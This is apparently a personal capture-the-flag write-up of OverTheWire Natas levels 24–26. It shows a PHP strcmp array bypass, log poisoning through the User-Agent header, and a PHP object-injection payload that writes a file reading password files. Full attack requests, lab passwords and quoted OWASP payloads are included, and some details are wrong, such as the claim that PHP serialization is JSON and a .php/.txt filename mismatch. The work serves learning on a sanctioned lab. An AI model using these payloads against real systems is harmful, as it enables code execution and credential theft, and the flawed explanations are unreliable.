> 0 if str1 is greater than str2, 
and 0 if they are equal.
```

Could not figure this one out at first.

After googeling for strcmp php vulnerability i found some posts. 

https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016

```
After a bit more research, it seemed that strcmp had some issues when comparing a string to something else.

If I set $_GET['password'] equal to an empty array, then strcmp would return a NULL. Due to some unherent weaknesses in PHP's comparisons, NULL == 0 will return true (more info)).
```

https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html

```
strcmp($str1, $str2) (Array injection)

Let’s suppose now you are a smart person and are not willing to use the Equal operator. Since you have a beautiful C background, you will stick to strcmp() function. Nice! A function created to compare strings cannot should not be vulnerable when doing its job.

According to the docs:

    strcmp(string $str1, string $str2) –> Returns < 0 if str1 is less than str2; > 0 if str1 is greater than str2, and 0 if they are equal.

Ok, so it means every time strcmp(str1, str2) is 0 the strings are equal. Hmmm… What if there was another what to make strcmp() 0? Well, what happens when we pass one string and one non-string parameter like an array to strcmp()? Right, it will result in a false statment and the result of strcmp() will be 0!.

<?php
        $str1 = "pink"; 
        $str2 = array("name" => "floyd");

        if(strcmp($str1, $str2 == 0)){
                echo "OMG twins!";
        }else{
                echo "Bieber, the king of the world";
        }
?>

Could you see what would the result be in case we changed str2 the way it is shown above?

    WARNING strcmp() expects parameter 2 to be string, array given on line number 5 OMG twins!

There it is! If we pass an array instead of a string to strcmp(), it gives a warning but evaluates the result as 0. This could be very useful for bypassing logins.
```

https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf


So of we pass passwd[]=1 we can cause 'strcmp() to barf'.

```php
strcmp(array(),"<censored>") -> NULL
```

```php
if((!strcmp)
# is the same as
if(strcmp == false)
```

Since the functions checks for a 0 we can use this 'barf' to get what we want.

```php
if(!strcmp($_REQUEST["passwd"],"<censored>")){
    # stuff
}
```

if we pass passwd[]=1 it will look like this.
```php
if(!strcmp(array(),"<censored>")){
    # stuff
}
```

GHF6X7YwACaYYssHVY05cFq83hRktl4c


## natas25
```php
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
```

bypass first the directory traversal check.  
if we pass .../...// it will be replaced to ../ .

```php
// check for directory traversal
if(strstr($filename,"../")){
    logRequest("Directory traversal attempt! fixing equest.");
    $filename=str_replace("../","",$filename);
}

print str_replace("../","",".../...//");
../
```

natas25.natas.labs.overthewire.org/?lang=.../...//language/de


got stuck at this point. Read up on a write up.

Rhe pages echo's 3 values. $__GREETING, $__MSG and $__FOOTER.
```php
echo "<h2>$__GREETING</h2>";
echo "<p align=\"justify\">$__MSG";
echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
```

Log function adds text from UserAgent to file if its triggered.  
It gets triggered if a directory traversal is found. This means if we add PHP code to the UserAgent we can write arbitrary code to logfiles in /var/www/natas/natas25/logs/natas25_SESSIONID.log.

```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

If we overwrite either $__GREETING, $__MSG or $__FOOTER by passing PHP code in the UserAgent we can get output back from our arbitrary code.

```
User-Agent: <?php global $__MSG; global $__FOOTER; global $__GREETING; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); $__GREETING=$__MSG; $__FOOTER=$__MSG; ?>
```

Since the safeinclude does not stop the request we can first trigger a log with a `../` and then add the `.../...//` for actual directory traversal.

So if we combine these 2 

```
GET /?lang=../.../...//logs/natas25_0fopbbtghrlijbe403knpoa5v5.log HTTP/1.1
Host: natas25.natas.labs.overthewire.org
User-Agent: <?php global $__MSG; global $__FOOTER; global $__GREETING; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); $__GREETING=$__MSG; $__FOOTER=$__MSG; ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
Connection: close
Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=0fopbbtghrlijbe403knpoa5v5
Upgrade-Insecure-Requests: 1
```

``` 
[23.09.2019 09::29:37]  "Directory traversal attempt! fixing request."
[23.09.2019 09::30:35]  "Directory traversal attempt! fixing request."
<h2>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
</h2><p align="justify">oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
<div align="right"><h6>oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
``` 

oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T


## natas26

```php 
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                            $color=imagecolorallocate($img,0xff,0x12,0x1c);
                            imageline($img,$object["x1"],$object["y1"],
                                    $object["x2"] ,$object["y2"] ,$color)
                        }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>
``` 

```php
<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>
```

```
GET /?x1=10&y1=10&x2=10&y2=10 HTTP/1.1
Host: natas26.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic bmF0YXMyNjpvR2dXQUo3emNHVDI4dllhekdvNHJraE9QRGhCdTM0VA==
Connection: close
Referer: http://natas26.natas.labs.overthewire.org/
Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=nrf0sdktpqu2fdfgld75cb10s5
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```
drawing=YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ%3D%3D

echo "YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEwIjtzOjI6InkxIjtzOjI6IjEwIjtzOjI6IngyIjtzOjI6IjEwIjtzOjI6InkyIjtzOjI6IjEwIjt9fQ==" | base64 -d
a:1:{i:0;a:4:{s:2:"x1";s:2:"10";s:2:"y1";s:2:"10";s:2:"x2";s:2:"10";s:2:"y2";s:2:"10";}}
Array
(
    [0] => Array
        (
            [x1] => 10
            [y1] => 10
            [x2] => 10
            [y2] => 10
        )

)

A Array is serialized and stored as base64 in a cookie called drawing. This means we can send over our own php as the cookie.

https://www.youtube.com/watch?v=uS37TujnLRw

serializeing data is just a way to export an some data from ram to some other place, like disk or over the network. 
Deserializeing data takes the seerialezed data and imports it.
Serialized data is usally JSON, YAML or XML.  
PHP uses JSON.

Could not get past this point, this is mostly caused by my lack of programming knowlodge. 

Never worked with classes, let alone construct or decstruct.   
Never worked with serializeing/deserializeing.

Used another write anD OWASP up to understand it what was going on.

https://www.owasp.org/index.php/PHP_Object_Injection  

```
PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.

In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:

    The application must have a class which implements a PHP magic method (such as __wakeup or __destruct) that can be used to carry out malicious attacks, or to start a "POP chain".
    All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be supported for such classes.
```

```
class Example1
{
   public $cache_file;

   function __construct()
   {
      // some PHP code...
   }

   function __destruct()
   {
      $file = "/var/www/cache/tmp/{$this->cache_file}";
      if (file_exists($file)) @unlink($file);
   }
}

// some PHP code...

$user_data = unserialize($_GET['data']);

// some PHP code...
```

```
In this example an attacker might be able to delete an arbitrary file via a Path Traversal attack, for e.g. requesting the following URL:

http://testsite.com/vuln.php?data=O:8:"Example1":1:{s:10:"cache_file";s:15:"../../index.php";}

```

```
Example 2

The example below shows a PHP class with an exploitable __wakeup method:

class Example2
{
   private $hook;

   function __construct()
   {
      // some PHP code...
   }

   function __wakeup()
   {
      if (isset($this->hook)) eval($this->hook);
   }
}

// some PHP code...

$user_data = unserialize($_COOKIE['data']);

// some PHP code...
```

```
In this example an attacker might be able to perform a Code Injection attack by sending an HTTP request like this:

GET /vuln.php HTTP/1.0
Host: testsite.com
Cookie: data=O%3A8%3A%22Example2%22%3A1%3A%7Bs%3A14%3A%22%00Example2%00hook%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D
Connection: close
```

```
data=O:8:"Example2":1:{s:14:"Example2":"hook";s:10:"phpinfo();";}
```

```
Where the cookie parameter "data" has been generated by the following script:

class Example2
{
   private $hook = "phpinfo();";
}

print urlencode(serialize(new Example2));

```

```
Example 3

This last example shows how it is possible to perform a SQL Injection attack using a "POP chain", for instance by leveraging a __toString method like this:

class Example3
{
   protected $obj;

   function __construct()
   {
      // some PHP code...
   }

   function __toString()
   {
      if (isset($this->obj)) return $this->obj->getValue();
   }
}

// some PHP code...

$user_data = unserialize($_POST['data']);

// some PHP code...

If the $user_data variable is an "Example3" object and it will be treated like a string somewhere in the code, then its __toString method will be called. Since this method will call the getValue method of the object stored into the "obj" property, it's possible to set that property to an arbitrary object, and execute its getValue method, if it is accessible, otherwise its __call method will be called, if it is defined. For the sake of ease, just think that when unserialize() is called, the class below is available within the application scope (or supported by autoloading):

class SQL_Row_Value
{
   private $_table;

   // some PHP code...

   function getValue($id)
   {
      $sql = "SELECT * FROM {$this->_table} WHERE id = " . (int)$id;
      $result = mysql_query($sql, $DBFactory::getConnection());
      $row = mysql_fetch_assoc($result);

      return $row['value'];
   }
}

In this example an attacker might be able to perform a SQL Injection attack by sending a POST request containing a "data" parameter generated by a script like this:

class SQL_Row_Value
{
   private $_table = "SQL Injection";
}

class Example3
{
   protected $obj;

   function __construct()
   {
      $this->obj = new SQL_Row_Value;
   }
}

print urlencode(serialize(new Example3));
```

https://n0j.github.io/2017/07/19/otw-natas-26.html  
https://n0j.github.io/2016/09/16/tryharder-php-object.html  

```
Often the way serialization bugs go is something occurs during an object’s constructor or destructor that the attacker can commandeer for nefarious purposes. I wrote about another PHP object serialization challenge here where the contents of a member variable were executed as a command in the constructor.

```


```
a constructor is a function which is called automatically when an instance of a class is created and a destructor is a function automatically called when an instance is destroyed. In PHP these are denoted by __construct() and __destruct() in the class definition.
```

```
Check out the Logger class. Both the constructor and destructor write to a file. What file? Whatever is stored in the $logFile member variable. What does it write? What ever is stored in the $initMsg and $exitMsg member variables. Ch-ching.

Recall that the definition of the class does not go along for the ride when an object is serialized. We only need to make a class named Logger, load up the member variables we want, and send it along. To do that, another short program on the side.
```

https://www.php.net/manual/en/language.oop5.serialization.php


```php
class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        $this->initMsg="heyyyyyy\n";
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
        $this->logFile= "/var/www/natas/natas26/img/n0j.php";
    }
}

$o = new Logger();
print base64_encode(serialize($o))."\n";
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjBqLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=
php > exit
@0fb5bda9f64c:/#
echo "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbjBqLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjk6ImhleXl5eXl5CiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=" | base64 -d
O:6:"Logger":3:{s:15:"LoggerlogFile";s:34:"/var/www/natas/natas26/img/n0j.txt";s:15:"LoggerinitMsg";s:9:"heyyyyyy
";s:15:"LoggerexitMsg";s:63:"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>
";}
```

```
Obviously the message we’re after is the password to natas27 so we grab that and load it into a variable. We know we can write to the img folder because that’s what the application does with legitimate images. We also know we’ll be able to read it back from there, again because that’s what the application does with legitimate images.
A note on how this works… why would we send a Logger object into a function that’s expecting arrays with coordinates and whatnot, doesn’t sound like that will work. 
Short answer - it doesn’t work! 

But the object is loaded into the $drawing variable so when its life ends the destructor will be called and that’s all we care about.
```

so basiclly, we overwrite the variables set in the logger class at a later stage in the script. We can do this since unserialize only loads the variables from classes into the application scope, not de the defination of the class it self when the object has been serialized.

We can overwrite these values since the cookie is used to send over the serialized data and we have full control over the cookie we send.

When deserializeing the cookie the entire cookie is added to $drawing. This means our initMsg, exitMsg and logFile from our custom logger class are now loaded into the application scope and now have replaced the orginal values when the class was defined.

```php
if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                            $color=imagecolorallocate($img,0xff,0x12,0x1c);
                            imageline($img,$object["x1"],$object["y1"],
                                    $object["x2"] ,$object["y2"] ,$color)
                        }
        }
```

Our overwritten variables do something since the destructors uses them. Destruct is called at the end of execution of the script which means our cookie has been loaded and replaced initMsg, exitMsg and logFile.

``` php
function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }
``` 

We now open our custom log file 'img/n0j.php' which contains ` <?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n"`, so we when we load it we get the password of natas27.

55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ